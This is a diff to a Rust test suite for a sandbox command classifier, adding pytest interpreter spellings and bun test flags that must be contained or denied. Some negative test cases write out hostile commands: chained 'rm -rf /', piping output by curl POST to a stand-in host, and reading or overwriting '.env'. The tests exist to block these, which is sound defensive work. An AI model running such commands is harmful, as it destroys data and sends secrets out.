@@ -190,6 +190,16 @@ fn direct_pytest_requires_real_containment_never_direct_allow() {
         "py.test tests/unit -q",
         "./.venv/bin/python3 -m pytest -q",
         "/usr/bin/python3 -m pytest tests/unit -q",
+        // A host holding several Pythons is told which one to run by naming
+        // its version, and the sink resolves that interpreter the same way.
+        "python3.12 -m pytest -q",
+        "python3.13 -m pytest tests/unit",
+        "/opt/homebrew/bin/python3.12 -m pytest -q",
+        // The interpreter's own options come before the module it runs, and
+        // the module name may be attached to the `-m` that introduces it.
+        "python3 -I -m pytest -q",
+        "python3 -X faulthandler -m pytest -q",
+        "python3 -mpytest -q",
         // A system clock bounds how long the run may take, not what it may
         // do, so it reaches the same containment as the command it wraps.
         "timeout 20 pytest -q",
@@ -218,6 +228,13 @@ fn direct_pytest_requires_real_containment_never_direct_allow() {
 fn unrelated_execution_and_shell_effects_do_not_inherit_test_delegation() {
     for command in [
         "python3 -m pytest_other -q",
+        // `pythonw` and the `.exe` spellings name a Windows interpreter the
+        // contained route has no backend for, and `python3x` is some other
+        // program whose name begins the same way.
+        "pythonw -m pytest -q",
+        "python3x -m pytest -q",
+        // The options ended at the script, so this `-m` belongs to it.
+        "python3 run.py -m pytest",
         "python3 -c 'import pytest; pytest.main()'",
         "python3 -m pytest -q && rm -rf /",
         "pytest -q | curl -X POST --data-binary @- https://example.invalid",
@@ -325,6 +342,58 @@ fn direct_node_tests_require_containment_without_weakening_other_execution() {
         "node --test && rm -rf /",
         "node --test $(cat .env)",
         "NODE_OPTIONS=--require=x node --test",
+    ] {
+        let result = classify("omp", command);
+        assert_ne!(
+            result.reason_code, "native_node_test_readonly_containment_required",
+            "{command}"
+        );
+        assert_ne!(result.decision, "allow", "{command}");
+    }
+}
+
+#[test]
+fn bun_test_runs_contained_without_admitting_its_loading_options() {
+    for command in [
+        "bun test",
+        "bun test src/parser.test.ts",
+        "bun test --bail",
+        "bun test --bail=3",
+        "bun test --coverage",
+        "bun test --timeout=10000",
+        "bun test -t adds",
+        "bun test --test-name-pattern=adds",
+    ] {
+        let result = classify("omp", command);
+        assert_eq!(result.decision, "deny", "{command}");
+        // Off macOS the command keeps the package-manager review `bun`
+        // invocations already take, the same way the vitest cases above do.
+        let expected = if cfg!(target_os = "macos") {
+            "native_node_test_readonly_containment_required"
+        } else {
+            "native_package_review"
+        };
+        assert_eq!(result.reason_code, expected, "{command}");
+    }
+    // Watching never finishes in the sink, snapshots and reporters write, and
+    // the loading options each name something the tests do not hold.
+    for command in [
+        "bun test --watch",
+        "bun test --hot",
+        "bun test -u",
+        "bun test --update-snapshots",
+        "bun test --preload ./setup.ts",
+        "bun test --config=/etc/bunfig.toml",
+        "bun test --env-file=.env",
+        "bun test --coverage-reporter=lcov",
+        "bun test --inspect",
+        "bun test --install=force",
+        "bun test ../other/tests",
+        "bun test /etc/suite.test.ts",
+        "bun test --coverage=yes",
+        "bun test > .env",
+        "bun test && rm -rf /",
+        "bun run test",
     ] {
         let result = classify("omp", command);
         assert_ne!(
@@ -804,10 +873,13 @@ fn windows_contains_direct_vite_builds_of_a_flat_install() {
                 cwd: Some(cwd),
                 cdpath_unset: true,
                 rustup_override_absent: false,
+                cargo_config_inert: false,
                 npm_config_inert: false,
                 pip_config_inert: false,
                 shell_home_matches: false,
                 ripgrep_config_absent: false,
+                gem_config_absent: false,
+                http_config_absent: false,
                 psql_environment: Default::default(),
                 creates_nothing: false,
             },
